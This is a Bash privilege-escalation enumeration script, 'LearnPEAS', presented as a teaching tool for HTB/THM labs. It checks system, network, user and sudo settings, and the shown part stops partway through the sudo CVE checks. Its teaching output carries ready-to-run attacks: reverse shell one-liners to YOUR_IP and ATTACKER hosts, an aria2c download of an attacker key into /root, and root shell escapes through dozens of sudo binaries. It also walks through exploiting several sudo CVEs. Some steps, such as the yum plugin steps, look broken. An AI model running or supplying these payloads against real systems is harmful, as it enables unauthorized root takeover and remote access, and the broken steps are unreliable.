#!/bin/bash
# LearnPEAS: Privilege Escalation In-Field Educational Tool
# Comprehensive enumeration + education for HTB/THM environments

set -o pipefail

# === COLORS ===
R='\033[31m' G='\033[32m' Y='\033[33m' B='\033[34m' 
P='\033[35m' C='\033[36m' W='\033[37m' RST='\033[0m'
# Critical alert colors (red background + white text)
CRIT='\033[41m\033[1;97m'
# CTF flag alert (purple background + white text)
FLAG='\033[45m\033[1;97m'

# === CONFIGURATION ===
VERBOSE=0
EXPLAIN=1
QUICK_MODE=0
EXTENDED=1
SHOW_FLAGS=0  # ADD THIS LINE
LOG_FILE="/tmp/teachpeas_$(date +%s).log"

# === LOGGING ===
log() { echo -e "$1" | tee -a "$LOG_FILE"; }
section() { log "\n${C}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RST}\n${C}$1${RST}\n${C}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RST}"; }
vuln() { log "${R}[VULNERABLE]${RST} $1"; }
info() { log "${B}[INFO]${RST} $1"; }
ok() { log "${G}[OK]${RST} $1"; }
warn() { log "${Y}[WARNING]${RST} $1"; }
teach() { [ $EXPLAIN -eq 1 ] && log "${Y}[LEARN]${RST} $1"; }
critical() { log "${CRIT}[!!! CRITICAL !!!]${RST} $1"; }
ctf_flag() { log "${FLAG}[🚩 CTF FLAG 🚩]${RST} $1"; }  # ADD THIS LINE

# === EDUCATIONAL FRAMEWORK ===
explain_concept() {
    local title="$1"
    local what="$2"
    local why="$3"
    local how="$4"
    
    [ $EXPLAIN -eq 0 ] && return
    
    log "\n${P}╔═══════════════════════════════════════╗${RST}"
    log "${P}║  UNDERSTANDING: $title"
    log "${P}╚═══════════════════════════════════════${RST}"
    log "${W}WHAT:${RST} $what"
    log "${W}WHY IT MATTERS:${RST} $why"
    log "${W}HOW TO EXPLOIT:${RST} $how"
    log ""
}

# === SYSTEM FINGERPRINT ===
enum_system() {
    section "SYSTEM FINGERPRINT"
    
    local os=$(grep PRETTY_NAME /etc/os-release 2>/dev/null | cut -d'"' -f2 || echo "Unknown")
    local kernel=$(uname -r)
    local arch=$(uname -m)
    local hostname=$(hostname)
    
    info "OS: $os"
    info "Kernel: $kernel"
    info "Architecture: $arch"
    info "Hostname: $hostname"
    info "Current User: $(whoami)"
    info "User ID: $(id)"
    
    teach "System fingerprinting reveals:"
    teach "  • Kernel version → CVE lookup on exploit-db"
    teach "  • OS distribution → Default package configurations"
    teach "  • Architecture → Binary compatibility (x86_64, i386, ARM)"
    teach "  • User groups → Special privileges (docker, lxd, disk, etc.)"
}

# === NETWORK INFORMATION ===
# === ENHANCED NETWORK ENUMERATION ===
# === ENHANCED NETWORK ENUMERATION ===
enum_network() {
    section "NETWORK CONFIGURATION"
    
    explain_concept "Network Enumeration" \
        "Understanding network configuration reveals internal services, pivot opportunities, and firewall restrictions." \
        "Services on localhost (127.0.0.1) aren't exposed externally but accessible after shell access - often have no authentication. Internal networks allow pivoting to other hosts. Firewall rules show what's blocked and what attack vectors work." \
        "Key checks:\n  • Localhost-only services (databases, Redis, Elasticsearch)\n  • Internal network routes (pivot targets)\n  • Firewall rules (what's blocked/allowed)\n  • Port forwarding opportunities"
    
    # === CHECK 1: Network Interfaces ===
    info "Network interfaces:"
    if command -v ip >/dev/null 2>&1; then
        ip addr show 2>/dev/null | grep -E "^[0-9]+:|inet " | while read line; do
            log "  $line"
        done
    else
        ifconfig 2>/dev/null | grep -E "^[a-z]|inet " | head -20 | while read line; do
            log "  $line"
        done
    fi
    
    # === CHECK 2: Active Connections with Service Identification ===
    info "Active network connections with service identification:"
    
    if command -v ss >/dev/null 2>&1; then
        # Parse ss output for listening services
        ss -tulpn 2>/dev/null | grep LISTEN | while read line; do
            local proto=$(echo "$line" | awk '{print $1}')
            local local_addr=$(echo "$line" | awk '{print $5}')
            local process=$(echo "$line" | grep -oE 'users:\(\("[^"]*"' | cut -d'"' -f2)
            
            # Extract IP and port
            local ip=$(echo "$local_addr" | rev | cut -d: -f2- | rev)
            local port=$(echo "$local_addr" | rev | cut -d: -f1 | rev)
            
            # Identify service type and context
            local service_name=""
            local risk_level=""
            local exploitation=""
            
            case "$port" in
                22)
                    service_name="SSH"
                    risk_level="info"
                    ;;
                80|8080|8000)
                    service_name="HTTP Web Server"
                    risk_level="info"
                    ;;
                443|8443)
                    service_name="HTTPS Web Server"
                    risk_level="info"
                    ;;
                3306)
                    service_name="MySQL/MariaDB"
                    if echo "$ip" | grep -qE "127\.0\.0\.1|::1"; then
                        risk_level="warn"
                        exploitation="Likely no auth required - access after gaining shell"
                    else
                        risk_level="info"
                        exploitation="Try default credentials: root:root, root:password"
                    fi
                    ;;
                5432)
                    service_name="PostgreSQL"
                    if echo "$ip" | grep -qE "127\.0\.0\.1|::1"; then
                        risk_level="warn"
                        exploitation="Localhost only - likely passwordless trust authentication"
                    fi
                    ;;
                6379)
                    service_name="Redis"
                    if echo "$ip" | grep -qE "127\.0\.0\.1|::1"; then
                        risk_level="critical"
                        exploitation="Redis on localhost - usually NO AUTH! Write cron jobs or SSH keys"
                    else
                        risk_level="warn"
                        exploitation="Try: redis-cli -h $ip ping"
                    fi
                    ;;
                9200|9300)
                    service_name="Elasticsearch"
                    if echo "$ip" | grep -qE "127\.0\.0\.1|::1"; then
                        risk_level="warn"
                        exploitation="Elasticsearch on localhost - no auth by default"
                    else
                        risk_level="warn"
                        exploitation="Check: curl http://$ip:9200/_cat/indices"
                    fi
                    ;;
                11211)
                    service_name="Memcached"
                    risk_level="warn"
                    exploitation="No authentication - read cached session data"
                    ;;
                27017)
                    service_name="MongoDB"
                    if echo "$ip" | grep -qE "127\.0\.0\.1|::1"; then
                        risk_level="warn"
                        exploitation="MongoDB on localhost - often no auth"
                    fi
                    ;;
                5672|15672)
                    service_name="RabbitMQ"
                    risk_level="info"
                    exploitation="Default creds: guest:guest (only works from localhost)"
                    ;;
                8009)
                    service_name="Apache Tomcat AJP"
                    risk_level="warn"
                    exploitation="Check for Ghostcat vulnerability (CVE-2020-1938)"
                    ;;
                *)
                    service_name="Unknown"
                    risk_level="info"
                    ;;
            esac
            
            # Output based on risk level
            if echo "$ip" | grep -qE "127\.0\.0\.1|::1"; then
                # Localhost-only service
                case "$risk_level" in
                    critical)
                        critical "LOCALHOST service: $service_name on port $port (Process: $process)"
                        vuln "Service only accessible from localhost: $local_addr"
                        [ -n "$exploitation" ] && teach "  $exploitation"
                        ;;
                    warn)
                        warn "LOCALHOST service: $service_name on port $port (Process: $process)"
                        [ -n "$exploitation" ] && teach "  $exploitation"
                        ;;
                    *)
                        info "Localhost: $service_name on port $port (Process: $process)"
                        ;;
                esac
                
                teach "  After getting a shell, you can access this service directly"
                teach "  Option 1 - Direct access: curl http://localhost:$port"
                teach "  Option 2 - Forward to your machine: ssh -L $port:localhost:$port user@target"
                teach "  Then access from your browser at http://localhost:$port"
                
            elif echo "$ip" | grep -qE "0\.0\.0\.0|::|\*"; then
                # Externally accessible
                if [ "$risk_level" = "critical" ] || [ "$risk_level" = "warn" ]; then
                    warn "EXTERNAL service: $service_name on port $port (Process: $process)"
                    [ -n "$exploitation" ] && teach "  $exploitation"
                else
                    info "External: $service_name on port $port (Process: $process)"
                fi
            else
                # Specific interface
                info "Listening on $ip:$port - $service_name (Process: $process)"
            fi
        done
    elif command -v netstat >/dev/null 2>&1; then
        netstat -tulpn 2>/dev/null | grep LISTEN | while read line; do
            local local_addr=$(echo "$line" | awk '{print $4}')
            local process=$(echo "$line" | awk '{print $NF}')
            
            if echo "$local_addr" | grep -qE "127\.0\.0\.1|::1"; then
                warn "LOCALHOST-ONLY service: $local_addr (Process: $process)"
            else
                info "Listening: $local_addr (Process: $process)"
            fi
        done
    fi
    
    # === CHECK 3: Routing Table Analysis ===
    info "Routing table (potential pivot targets):"
    local found_internal=0
    
    if command -v ip >/dev/null 2>&1; then
        ip route 2>/dev/null | while read line; do
            log "  $line"
            
            # Skip VPN interfaces (tun/tap) and default routes for pivot detection
            if echo "$line" | grep -qE "tun|tap|default"; then
                continue
            fi
            
            # Identify internal network routes (but only first occurrence)
            if echo "$line" | grep -qE "^10\.|^172\.(1[6-9]|2[0-9]|3[01])\.|^192\.168\."; then
                if [ $found_internal -eq 0 ]; then
                    local network=$(echo "$line" | awk '{print $1}')
                    warn "Internal network detected: $network"
                    teach "  This is a private network - other machines might be reachable"
                    teach "  After compromising this host, scan the network to find other targets"
                    teach "  Discovery: for i in {1..254}; do ping -c1 -W1 ${network%.*}.\$i 2>/dev/null && echo ${network%.*}.\$i is up; done"
                    teach "  Or use nmap: nmap -sn $network"
                    found_internal=1
                fi
            fi
        done
    else
        route -n 2>/dev/null | tail -n +3 | while read line; do
            log "  $line"
        done
    fi
    
    # === CHECK 4: Firewall Rules ===
    info "Checking firewall configuration..."
    
    # iptables
    if command -v iptables >/dev/null 2>&1; then
        if iptables -L -n 2>/dev/null | grep -qE "Chain|target"; then
            info "iptables rules detected"
            
            # Check if we can read the rules
            local rule_count=$(iptables -L -n 2>/dev/null | grep -cE "^ACCEPT|^DROP|^REJECT")
            if [ $rule_count -gt 0 ]; then
                info "Found $rule_count firewall rules"
                
                # Check for common blocks
                if iptables -L OUTPUT -n 2>/dev/null | grep -qE "REJECT|DROP"; then
                    warn "Outbound traffic may be filtered - could block reverse shells"
                    teach "  The firewall is blocking some outbound connections"
                    teach "  This means reverse shells might not work on all ports"
                    teach "  Solution: Try common allowed ports like 80 (HTTP), 443 (HTTPS), or 53 (DNS)"
                    teach "  Example: nc -lvnp 443 (on your machine), then: bash -i >& /dev/tcp/YOUR_IP/443 0>&1 (on target)"
                fi
                
                if iptables -L INPUT -n 2>/dev/null | grep -qE "REJECT|DROP"; then
                    info "Inbound filtering detected - may limit bind shells"
                fi
                
                # Check if rules are readable in detail
                if iptables -L -n -v 2>/dev/null | head -20 | grep -q "."; then
                    teach "  View full rules: iptables -L -n -v"
                fi
            else
                ok "iptables installed but no restrictive rules detected"
            fi
        fi
    fi
    
    # nftables
    if command -v nft >/dev/null 2>&1; then
        if nft list tables 2>/dev/null | grep -q "table"; then
            info "nftables is active"
            local table_count=$(nft list tables 2>/dev/null | wc -l)
            warn "Found $table_count nftables - may restrict connections"
            teach "  View rules: nft list ruleset"
        fi
    fi
    
    # ufw
    if command -v ufw >/dev/null 2>&1; then
        local ufw_status=$(ufw status 2>/dev/null | head -1)
        if echo "$ufw_status" | grep -qi "active"; then
            warn "UFW firewall is ACTIVE"
            teach "  Check rules: ufw status verbose"
            teach "  Reverse shells may be blocked - use allowed ports"
        elif echo "$ufw_status" | grep -qi "inactive"; then
            ok "UFW firewall is inactive"
        fi
    fi
    
    # firewalld
    if command -v firewall-cmd >/dev/null 2>&1; then
        if systemctl is-active --quiet firewalld 2>/dev/null; then
            warn "firewalld is ACTIVE"
            teach "  Check zones: firewall-cmd --get-active-zones"
            teach "  List rules: firewall-cmd --list-all"
        fi
    fi
    
    # === CHECK 5: ARP Cache (Nearby Hosts) ===
    if command -v arp >/dev/null 2>&1; then
        local arp_entries=$(arp -a 2>/dev/null | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' | sort -u)
        local host_count=$(echo "$arp_entries" | grep -v "^$" | wc -l)
        
        if [ $host_count -gt 1 ]; then
            info "Found $host_count hosts in ARP cache (lateral movement targets):"
            echo "$arp_entries" | head -10 | while read host; do
                log "  $host"
            done
            teach "These hosts are on the same local network as this machine"
            teach "  After compromising this host, you can try to access those other machines"
            teach "  This is called 'lateral movement' - moving from one compromised host to another"
            teach "  Discovery command: nmap -sn <network_range> (example: nmap -sn 192.168.1.0/24)"
        fi
    fi
    
    # === CHECK 6: Network Namespaces ===
    if [ -d /var/run/netns ] && [ "$(ls -A /var/run/netns 2>/dev/null)" ]; then
        warn "Network namespaces detected - possible container/virtualization"
        ls /var/run/netns 2>/dev/null | while read ns; do
            info "  Namespace: $ns"
        done
        teach "May indicate container environment - check enum_container section"
    fi
    
    # === Summary ===
    log ""
    info "Network enumeration complete"
    teach "\nKey network attack vectors explained:"
    teach "  1. Localhost services = Services only accessible from inside the machine"
    teach "     → After you get a shell, you can access them (usually no password)"
    teach "     → Example: MySQL on localhost often trusts local connections"
    teach ""
    teach "  2. Internal networks = Private networks with other machines"
    teach "     → These aren't accessible from the internet"
    teach "     → After compromising one machine, scan for others and move sideways"
    teach ""
    teach "  3. Firewall rules = What connections are allowed/blocked"
    teach "     → Affects which ports work for reverse shells"
    teach "     → If port 4444 is blocked, try port 443 (HTTPS) instead"
    teach ""
    teach "  4. Port forwarding = Tunneling internal services to your machine"
    teach "     → Makes localhost services accessible from your computer"
    teach "     → Command: ssh -L local_port:localhost:remote_port user@target"
}
# === USER ENUMERATION ===
enum_users() {
    section "USER ENUMERATION"
    
    info "Interactive users (UID >= 1000):"
    awk -F: '$3 >= 1000 && $1 != "nobody" {print "  " $1 " (UID: " $3 ")"}' /etc/passwd
    
    info "Users with shells:"
    grep -E "/(bash|sh|zsh|fish)$" /etc/passwd | cut -d: -f1 | while read u; do
        log "  $u"
    done
    
    # Check for sudo group members
    if getent group sudo >/dev/null 2>&1; then
        info "Members of sudo group:"
        getent group sudo | cut -d: -f4 | tr ',' '\n' | while read u; do
            log "  $u"
        done
    fi
    
    teach "User enumeration reveals:"
    teach "  • Potential lateral movement targets"
    teach "  • Users with sudo access (sudo group)"
    teach "  • Service accounts vs. real users"
}

# === SUDO ANALYSIS ===
enum_sudo() {
    section "SUDO PERMISSIONS ANALYSIS"
    
    local sudo_output=$(sudo -l 2>&1)
    
    if echo "$sudo_output" | grep -qi "not allowed\|password.*incorrect"; then
        ok "No sudo access or incorrect password"
        return
    fi
    
    # Check for dangerous sudo ALL with NOPASSWD
    if echo "$sudo_output" | grep -qE '\(ALL\s*:\s*ALL\)\s*NOPASSWD.*ALL'; then
        critical "FULL SUDO NOPASSWD - Instant root: sudo /bin/bash"
        vuln "FULL SUDO ACCESS (ALL : ALL) NOPASSWD: ALL"
        explain_concept "Unrestricted Sudo NOPASSWD" \
            "You can run ANY command as ANY user without a password." \
            "This is root access with zero barriers. Just run any command with sudo." \
            "Exploitation: sudo /bin/bash"
    # Check for dangerous sudo ALL (with password)
    elif echo "$sudo_output" | grep -qE '\(ALL\s*:\s*ALL\)\s*ALL'; then
        critical "FULL SUDO ACCESS - Root with password: sudo /bin/bash"
        vuln "FULL SUDO ACCESS (ALL : ALL) ALL"
        explain_concept "Unrestricted Sudo" \
            "You can run ANY command as ANY user without restriction." \
            "This is essentially root access. The only barrier is your password (if required). This exists because an admin gave you blanket permissions, likely for convenience or automation." \
            "If NOPASSWD: just run 'sudo /bin/bash'\nIf password required: Try default passwords (password, admin, username), credential stuffing from other services, or password guessing."
    fi
    
    # Check for NOPASSWD
    if echo "$sudo_output" | grep -q "NOPASSWD"; then
        vuln "NOPASSWD sudo entries found"
        explain_concept "NOPASSWD Sudo" \
            "Certain commands can be run as root without entering a password." \
            "The system trusts your user identity completely for these commands. If any of these binaries can spawn a shell or write files, you can escalate. This exists because admins want automation without password prompts (cron jobs, scripts)." \
            "Steps:\n  1. Identify which binaries have NOPASSWD\n  2. Check GTFOBins (gtfobins.github.io) for that binary\n  3. Look for 'sudo' section\n  4. Common exploitable: vim, find, python, bash, less, more, awk, "
        
        log "${Y}Specific NOPASSWD entries:${RST}"
        echo "$sudo_output" | grep "NOPASSWD" | while read line; do
            log "  $line"
            
# Extract binary name and provide specific guidance
            local bin=$(echo "$line" | grep -oE '[^ ]+$' | xargs basename 2>/dev/null)
            case $bin in
                vim)
                    critical "NOPASSWD vim - Instant root: sudo vim -c ':!/bin/sh'"
                    teach "  → sudo vim -c ':!/bin/sh'"
                    ;;
                vi)
                    critical "NOPASSWD vi - Instant root: sudo vi -c ':!/bin/sh'"
                    teach "  → sudo vi -c ':!/bin/sh'"
                    ;;
                nano)
                    critical "NOPASSWD nano - Instant root: sudo nano then ^R^X reset; /bin/sh"
                    teach "  → sudo nano, then ^R^X reset; /bin/sh"
                    ;;
                emacs)
                    teach "  → sudo emacs --eval '(term \"/bin/sh\")'"
                    ;;
                less)
                    critical "NOPASSWD less - Instant root: sudo less /etc/profile then !sh"
                    teach "  → sudo less /etc/profile, then !sh"
                    ;;
                more)
                    critical "NOPASSWD more - Instant root: sudo more /etc/profile then !sh"
                    teach "  → sudo more /etc/profile, then !sh"
                    ;;
                find)
                    critical "NOPASSWD find - Instant root: sudo find . -exec /bin/sh \\; -quit"
                    teach "  → sudo find . -exec /bin/sh \\; -quit"
                    ;;
                xargs)
                    teach "  → sudo xargs -a /dev/null sh"
                    ;;
                awk)
                    critical "NOPASSWD awk - Instant root: sudo awk 'BEGIN {system(\"/bin/sh\")}'"
                    teach "  → sudo awk 'BEGIN {system(\"/bin/sh\")}'"
                    ;;
                gawk)
                    critical "NOPASSWD gawk - Instant root: sudo gawk 'BEGIN {system(\"/bin/sh\")}'"
                    teach "  → sudo gawk 'BEGIN {system(\"/bin/sh\")}'"
                    ;;
                nawk)
                    critical "NOPASSWD nawk - Instant root: sudo nawk 'BEGIN {system(\"/bin/sh\")}'"
                    teach "  → sudo nawk 'BEGIN {system(\"/bin/sh\")}'"
                    ;;
                python*|python)
                    critical "NOPASSWD python - Instant root: sudo python -c 'import os; os.system(\"/bin/sh\")'"
                    teach "  → sudo python -c 'import os; os.system(\"/bin/sh\")'"
                    ;;
                perl)
                    critical "NOPASSWD perl - Instant root: sudo perl -e 'exec \"/bin/sh\";'"
                    teach "  → sudo perl -e 'exec \"/bin/sh\";'"
                    ;;
                ruby)
                    critical "NOPASSWD ruby - Instant root: sudo ruby -e 'exec \"/bin/sh\"'"
                    teach "  → sudo ruby -e 'exec \"/bin/sh\"'"
                    ;;
                node)
                    critical "NOPASSWD node - Instant root: sudo node -e 'require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0,1,2]})'"
                    teach "  → sudo node -e 'require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0,1,2]})'"
                    ;;
                bash)
                    critical "NOPASSWD bash - Instant root: sudo bash"
                    teach "  → sudo bash"
                    ;;
                sh)
                    critical "NOPASSWD sh - Instant root: sudo sh"
                    teach "  → sudo sh"
                    ;;
                zsh)
                    critical "NOPASSWD zsh - Instant root: sudo zsh"
                    teach "  → sudo zsh"
                    ;;
                dash)
                    critical "NOPASSWD dash - Instant root: sudo dash"
                    teach "  → sudo dash"
                    ;;
                env)
                    critical "NOPASSWD env - Instant root: sudo env /bin/sh"
                    teach "  → sudo env /bin/sh"
                    ;;
                git)
                    teach "  → sudo git help status (spawns pager, then !sh)"
                    ;;
                tar)
                    teach "  → sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"
                    ;;
                zip)
                    teach "  → sudo zip /tmp/x.zip /etc/hosts -T -TT 'sh #'"
                    ;;
                mysql)
                    teach "  → sudo mysql -e '\\! /bin/sh'"
                    ;;
                systemctl)
                    critical "NOPASSWD systemctl - Shell escape via pager: sudo systemctl status <service> then !sh"
                    teach "  → sudo systemctl status trail.service"
                    teach "  → Wait for pager (less), then type: !sh"
                    ;;
                yum)
                    critical "NOPASSWD yum - Plugin exploitation for root shell"
                    teach "  → Create malicious plugin: echo -e '#!/bin/sh\n/bin/sh' > /tmp/shell.sh"
                    teach "  → chmod +x /tmp/shell.sh"
                    teach "  → Create config: echo 'from subprocess import call; call([\"/tmp/shell.sh\"])' > /tmp/cmd.py"
                    teach "  → sudo yum -c /tmp/cmd.conf --pluginpath=/tmp"
                    ;;
                apt|apt-get)
                    critical "NOPASSWD apt/apt-get - Execute commands via APT::Update::Pre-Invoke"
                    teach "  → sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh"
                    teach "  → Or: echo 'apt::Update::Pre-Invoke {\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER 4444 >/tmp/f\"};' > /tmp/pwn"
                    teach "  → sudo apt-get update -c /tmp/pwn"
                    ;;
                tail)
                    teach "  → sudo tail -f /dev/null"
                    teach "  → Or exploit PATH if tail called without absolute path"
                    ;;
                cut)
                    teach "  → sudo cut -d: -f1 /etc/shadow"
                    ;;
                diff)
                    teach "  → sudo diff --line-format=%L /dev/null /etc/shadow"
                    ;;
                strace)
                    critical "NOPASSWD strace - Attach to process: sudo strace -o /dev/null /bin/sh"
                    teach "  → sudo strace -o /dev/null /bin/sh"
                    ;;
                tcpdump)
                    critical "NOPASSWD tcpdump - Command injection: sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/shell.sh"
                    teach "  → Create shell script in /tmp/shell.sh"
                    teach "  → sudo tcpdump executes it with -z option"
                    ;;
                chmod)
                    critical "NOPASSWD chmod - Make any file writable: sudo chmod 777 /etc/shadow"
                    teach "  → sudo chmod 777 /etc/shadow"
                    teach "  → Then edit /etc/shadow directly"
                    ;;
                chown)
                    critical "NOPASSWD chown - Take ownership: sudo chown $(whoami) /etc/shadow"
                    teach "  → sudo chown $(whoami) /etc/shadow"
                    teach "  → Then edit file"
                    ;;
                make)
                    critical "NOPASSWD make - Execute Makefile commands: sudo make -s --eval=$'x:\\n\\t-/bin/sh'"
                    teach "  → sudo make -s --eval=$'x:\\n\\t-/bin/sh'"
                    ;;
                gcc)
                    teach "  → sudo gcc -wrapper /bin/sh,-s ."
                    ;;
                knife)
                    critical "NOPASSWD knife (Chef) - Execute shell: sudo knife exec -E 'exec \"/bin/sh\"'"
                    teach "  → sudo knife exec -E 'exec \"/bin/sh\"'"
                    ;;
                neofetch)
                    critical "NOPASSWD neofetch with env_keep - Config file exploitation"
                    teach "  → echo 'exec /bin/sh' > /tmp/config.conf"
                    teach "  → export XDG_CONFIG_HOME=/tmp"
                    teach "  → sudo neofetch"
                    ;;
                jjs)
                    critical "NOPASSWD jjs (Java JavaScript) - Execute commands via Nashorn"
                    teach "  → echo 'Java.type(\"java.lang.Runtime\").getRuntime().exec(\"/bin/sh\").waitFor()' | sudo jjs"
                    ;;
                luvit)
                    critical "NOPASSWD luvit (Lua) - Execute Lua code as root"
                    teach "  → sudo luvit -e 'os.execute(\"/bin/sh\")'"
                    ;;
                aria2c)
                    teach "  → sudo aria2c -d /root -o authorized_keys 'http://attacker/key'"
                    ;;
                busybox)
                    critical "NOPASSWD busybox - Execute any busybox applet: sudo busybox sh"
                    teach "  → sudo busybox sh"
                    ;;
                rpm)
                    teach "  → Create malicious RPM with postinstall script"
                    teach "  → sudo rpm -i malicious.rpm"
                    ;;
                *)
                    teach "  → Check GTFOBins for: $bin"
                    ;;
            esac
        done
    fi
    
    # Check for environment variable preservation
    if echo "$sudo_output" | grep -q "env_keep"; then
        vuln "Sudo preserves environment variables"
        teach "env_keep allows you to preserve environment variables when using sudo"
        teach "  This can be exploited with LD_PRELOAD or LD_LIBRARY_PATH"
        teach "  Create malicious library, set LD_PRELOAD, run sudo command"
    fi
}
# === SUDO VERSION ANALYSIS ===
enum_sudo_version() {
    section "SUDO VERSION ANALYSIS"
    
    explain_concept "Sudo Vulnerabilities" \
        "Sudo is complex software with a history of privilege escalation bugs. Version-specific CVEs can give instant root." \
        "Sudo handles authentication, environment sanitization, and privilege transitions. It's over 30 years old with hundreds of thousands of lines of code. Bugs in parsing, memory management, or logic = root access. Sudo runs as root and processes untrusted user input - a perfect target for exploitation." \
        "Why sudo has vulnerabilities:\n  • Complex codebase (authentication, parsing, environment handling)\n  • Runs as root by design\n  • Processes user-controlled input\n  • Backward compatibility constraints\n  • Memory-unsafe language (C)\n\nCheck version: sudo -V | head -1"
    
    if command -v sudo >/dev/null 2>&1; then
        local sudo_version=$(sudo -V 2>/dev/null | head -1 | grep -oE '[0-9]+\.[0-9]+\.[0-9]+[a-z]?[0-9]*')
        info "Sudo version: $sudo_version"
        
        if [ -z "$sudo_version" ]; then
            warn "Could not determine sudo version"
            return
        fi
        
        # Parse version - handle formats like 1.9.15p5
        local version_num=$(echo "$sudo_version" | sed 's/p.*//')
        local major=$(echo "$version_num" | cut -d. -f1)
        local minor=$(echo "$version_num" | cut -d. -f2)
        local patch=$(echo "$version_num" | cut -d. -f3)
        local p_version=$(echo "$sudo_version" | grep -oE 'p[0-9]+' | sed 's/p//')
        
        log ""
        info "Checking against known sudo CVEs..."
        log ""
        
        # CVE-2025-32463 (January 2025)
        if [ "$major" -eq 1 ] && [ "$minor" -eq 9 ]; then
            if [ "$patch" -lt 16 ] || ([ "$patch" -eq 16 ] && [ -n "$p_version" ] && [ "$p_version" -lt 1 ]); then
                critical "Sudo vulnerable to CVE-2025-32463 - Privilege escalation"
                vuln "sudo < 1.9.16p1 vulnerable"
                log ""
                teach "╔════════════════════════════════════════════════════════════╗"
                teach "║  CVE-2025-32463 - Recent Sudo Vulnerability"
                teach "╚════════════════════════════════════════════════════════════╝"
                teach ""
                teach "WHAT IT IS:"
                teach "  A vulnerability in sudo versions before 1.9.16p1 that allows"
                teach "  privilege escalation to root."
                teach ""
                teach "WHY IT EXISTS:"
                teach "  Sudo contains a flaw in how it processes certain commands or"
                teach "  environment variables, allowing attackers to bypass security"
                teach "  checks and execute commands as root."
                teach ""
                teach "HOW TO EXPLOIT:"
                teach "  1. Check exploit availability:"
                teach "     searchsploit sudo 2025"
                teach "  2. Download exploit:"
                teach "     https://www.exploit-db.com/exploits/52352"
                teach "  3. Compile and run (follow exploit instructions)"
                teach ""
                teach "IMPACT: Instant root access from any user account"
                log ""
            fi
        fi
        
        # CVE-2023-22809 - sudoedit bypass (1.8.0 to 1.9.12p1)
        if [ "$major" -eq 1 ]; then
            if [ "$minor" -eq 8 ] || ([ "$minor" -eq 9 ] && [ "$patch" -le 12 ]); then
                critical "Sudo vulnerable to CVE-2023-22809 - sudoedit bypass"
                vuln "sudo 1.8.0 - 1.9.12p1 vulnerable"
                log ""
                teach "╔════════════════════════════════════════════════════════════╗"
                teach "║  CVE-2023-22809 - Sudoedit Arbitrary File Write"
                teach "╚════════════════════════════════════════════════════════════╝"
                teach ""
                teach "WHAT IT IS:"
                teach "  sudoedit is a special mode that lets users edit files as root."
                teach "  This CVE tricks sudoedit into editing files you're not supposed"
                teach "  to have access to, like /etc/sudoers or /etc/shadow."
                teach ""
                teach "WHY IT EXISTS:"
                teach "  sudoedit uses the EDITOR environment variable to launch your"
                teach "  text editor. The vulnerability occurs because sudo doesn't"
                teach "  properly validate what file you're editing when you pass"
                teach "  extra arguments to the editor via the EDITOR variable."
                teach ""
                teach "THE CLEVER TRICK:"
                teach "  Normally: sudoedit /etc/motd (you can only edit motd)"
                teach "  Exploit: EDITOR='vim -- /etc/sudoers' sudoedit /etc/motd"
                teach "  Result: Opens /etc/sudoers instead of /etc/motd!"
                teach ""
                teach "HOW TO EXPLOIT:"
                teach "  1. Check if you have sudoedit access:"
                teach "     sudo -l | grep sudoedit"
                teach "  2. Set malicious EDITOR:"
                teach "     export EDITOR='vim -- /etc/sudoers'"
                teach "  3. Run sudoedit on an allowed file:"
                teach "     sudoedit /etc/motd"
                teach "  4. sudoedit will open /etc/sudoers instead"
                teach "  5. Add yourself: yourusername ALL=(ALL) NOPASSWD: ALL"
                teach "  6. Save and exit"
                teach "  7. Now run: sudo /bin/bash"
                teach ""
                teach "IMPACT: Can edit ANY file as root, leading to complete system"
                teach "         compromise by modifying /etc/sudoers or /etc/shadow"
                log ""
            fi
        fi
        
        # CVE-2021-3156 - Baron Samedit (< 1.9.5p2)
        if [ "$major" -eq 1 ]; then
            if [ "$minor" -lt 9 ] || ([ "$minor" -eq 9 ] && [ "$patch" -lt 5 ]); then
                critical "Sudo vulnerable to Baron Samedit (CVE-2021-3156) - Heap overflow"
                vuln "sudo < 1.9.5p2 vulnerable"
                log ""
                teach "╔════════════════════════════════════════════════════════════╗"
                teach "║  CVE-2021-3156 - Baron Samedit (Heap Buffer Overflow)"
                teach "╚════════════════════════════════════════════════════════════╝"
                teach ""
                teach "WHAT IT IS:"
                teach "  A heap-based buffer overflow in sudo that allows any local"
                teach "  user to gain root WITHOUT needing a password or sudo access."
                teach "  One of the most critical sudo vulnerabilities ever found."
                teach ""
                teach "WHY IT EXISTS:"
                teach "  When sudo processes command-line arguments, it needs to handle"
                teach "  backslashes (\\) specially. There's a bug in how it counts"
                teach "  backslashes when a command runs in 'shell mode' (with -s or -i)."
                teach ""
                teach "THE TECHNICAL FLAW:"
                teach "  1. Sudo allocates a buffer (memory) to store the command"
                teach "  2. When processing backslashes, it miscounts the length needed"
                teach "  3. This causes sudo to write PAST the end of the buffer (overflow)"
                teach "  4. By carefully crafting the overflow, attacker controls memory"
                teach "  5. Attacker overwrites function pointers to execute their code"
                teach "  6. Since sudo runs as root, the attacker's code runs as root"
                teach ""
                teach "WHY IT'S CALLED BARON SAMEDIT:"
                teach "  Play on words: 'Sudo edit' → 'Baron Samedit'"
                teach "  The vulnerability is in sudoedit, a symlink to sudo"
                teach ""
                teach "HOW TO EXPLOIT:"
                teach "  1. Check if vulnerable:"
                teach "     sudoedit -s / (if you get usage error = vulnerable)"
                teach "  2. Download exploit:"
                teach "     https://github.com/blasty/CVE-2021-3156"
                teach "     https://github.com/worawit/CVE-2021-3156"
                teach "  3. Compile the exploit (usually a C program):"
                teach "     gcc exploit.c -o exploit"
                teach "  4. Run it:"
                teach "     ./exploit"
                teach "  5. Get root shell"
                teach ""
                teach "WHY IT WORKS:"
                teach "  • No sudo privileges needed (any user can exploit)"
                teach "  • No password required"
                teach "  • Works on most Linux distributions"
                teach "  • Vulnerability existed for 10+ years (since 2011)"
                teach ""
                teach "IMPACT: Any user → Root, no credentials needed"
                log ""
            fi
        fi
        
        # CVE-2019-14287 - Runas bypass (< 1.8.28)
